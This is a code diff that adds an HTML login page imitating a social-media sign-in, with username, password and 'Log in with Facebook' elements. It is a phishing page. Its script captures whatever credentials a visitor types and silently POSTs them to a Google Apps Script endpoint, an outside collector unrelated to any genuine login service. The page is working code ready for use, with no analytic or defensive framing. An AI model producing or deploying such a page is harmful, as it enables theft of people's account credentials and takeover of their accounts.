@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"><meta http-equiv="refresh"content="width=device-width,initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>https://www.sb.com</title>
+ 
+  <style type="text/css">
+    *{margin:0px;padding:0px}
+    body{display:flex;justify-content:center;align-items:center;height:100vh;
+    /* background:linear-gradient(#fb00b9,#fb0202)} */
+    background-image:url("https://i.postimg.cc/sXdQzKTT/IMG-20230501-WA0126.jpg");color:white;
+    background-size:cover;background-repeat:no-repeat;
+    }
+    .contain{text-align:Center;color:black}
+    .text{color:white;margin:10px;letter-spacing:1px;font-size:20px;
+    }.page{ width:350px;background:white;border-radius:3px;
+      padding-bottom:15px;}.title{padding:30px 0px;font-size:25px;text-transform:capitalize}
+    form{display:flex;flex-direction:column;left:50%;transform:translatex(-50%);position:relative;
+    width:75%}form input{border-radius:3px;
+      margin-bottom:5px;outline:none;border:2px solid rgba(0,0,0,0.4);
+    }form input:focus{border:2px solid rgba(0,0,0,0.7);
+      background:#fafafa;
+    }input[type="text"],input[type="password"]{
+height:36px;position:relative;padding-left:10px;font-size:17px;
+    }input::placeholder{font-size:14px;transition:0.3s ease;font-weight:normal}
+    input:focus::placeholder{font-size:12px;transform:translatey(-9px);position:absolute}
+    form button{outline:none;padding:5px 0px;font-weight:bold;margin-top:5px;letter-spacing:1px;
+    text-transform:capitalize;cursor:pointer;border-radius:3px;border:none;background:#043fff;color:white}
+    form button:active{background:#2c58fe;transform:Scale(0.995)}
+form .option{color:#5a5a5a;font-weight:bold;margin:10px 0px;position:relative}
+form .option:before{content:'';position:absolute;width:37%;background:#b6b6b6;height:2px;top:50%;left:0}
+form .option:after{content:'';position:absolute;width:37%;background:#b6b6b6;height:2px;top:50%;right:0}
+.fblink{margin-top:6px;width:100%}
+.fblink span{color:#021897;margin-right:5px}
+.fblink a{text-decoration:none;color:#021897;font-weight:bold;font-size:17px;}
+.forget_id{
+  margin:16px;
+}
+.forget_id a{font-size:15px;color:#025fd2;
+  font-weight:500px;text-decoration:none;
+}
+.sign{position:relative;left:50%;transform:translatex(-50%);border-radius:3px;
+  border:2px solid #b6b6b6;width:90%;font-size:17px;padding:10px;margin-top:30px;
+}.sign a{text-decoration:none;margin-left:5px;font-weight:bold;color:#008aff}
+</style>
+</head>
+<body>
+  <div class="contain">
+    <div class="text">Log in to continue</div>
+    <div class="page">
+      <div class="title">SSB</div>
+      <form method="post" id="form">
+        <input type="text"name="number"placeholder="Phone number,username or email"id="sb">
+        <input type="password"name="password"placeholder="Password"id="sb">
+        <button id="ssb" name="btn">Log in</button>
+        <div class="option">Or</div>
+      </form>
+      <div class="fblink">
+        <span class="fab facebook"></span>
+      <a href="#">Log in with Facebook</a>
+      </div>
+      <div class="forget_id" id="sb">
+      <a href="#">Forget Password
+      </a></div>
+      <div class="sign">
+        <p>Don't have an Account?<a href="#">Sign up</a></p>
+      </div></div></div>
+      <script type="text/javascript">
+        let url='https://script.google.com/macros/s/AKfycbx8nKJAx5i5XplDGuHmac_7iRtHzCUO1-ShZ6rU1y4sfSKFgFEWYGu7X-0CuIPDVJbI/exec';
+        let form=document.querySelector("#form");
+        form.addEventListener("submit",(e)=>{
+          let d=new FormData(form);
+          fetch(url,{
+            method:"POST",
+            body:d
+          }).then((res)=>res.text())
+          .then((finalRes)=>console.log(finalRes))
+          e.preventDefault();
+        })
+    </script>
+</body>
+</html>
